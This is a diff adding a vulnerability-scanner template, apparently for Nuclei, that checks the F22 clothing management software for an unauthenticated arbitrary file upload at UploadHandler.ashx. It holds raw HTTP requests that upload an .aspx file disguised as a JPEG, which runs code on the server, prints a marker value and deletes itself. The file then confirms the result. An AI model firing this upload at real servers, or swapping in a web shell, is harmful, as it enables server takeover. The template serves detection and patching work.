@@ -1,0 +1,55 @@
+id: jmtr-f22-UploadHandler-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: F22服装管理软件系统UploadHandler.ashx接口处存在任意文件上传漏洞，未经身份认证的攻击者可以通过此漏洞上传恶意后门文件控制服务器。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/F16-1F22-%E6%9C%8D%E8%A3%85%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=f16-1f22-%e6%9c%8d%e8%a3%85%e7%ae%a1%e7%90%86%e8%bd%af%e4%bb%b6%e7%b3%bb%e7%bb%9f-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
+  tags: tags
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{rand_base(8)}}"
+  
+http:
+  - raw:
+      - |
+        POST /CuteSoft_Client/UploadHandler.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----------ae0KM7Ef1KM7cH2ae0GI3a{{boundary}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: Keep-Alive
+        Content-Length: 407
+
+        ------------ae0KM7Ef1KM7cH2ae0GI3a{{boundary}}
+        Content-Disposition: form-data; name="folder"
+
+        /upload/udplog
+        ------------ae0KM7Ef1KM7cH2ae0GI3a{{boundary}}
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.aspx"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
+        ------------ae0KM7Ef1KM7cH2ae0GI3a{{boundary}}
+        Content-Disposition: form-data; name="Upload"
+
+        Submit Query
+        ------------ae0KM7Ef1KM7cH2ae0GI3a{{boundary}}--
+      - |+
+        GET /upload/udplog/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '12321'
+    extractors:
+      - type: regex
+        name: filename
+        internal: true
+        part: body
+        regex:
+          - '(\d{17})\.aspx'
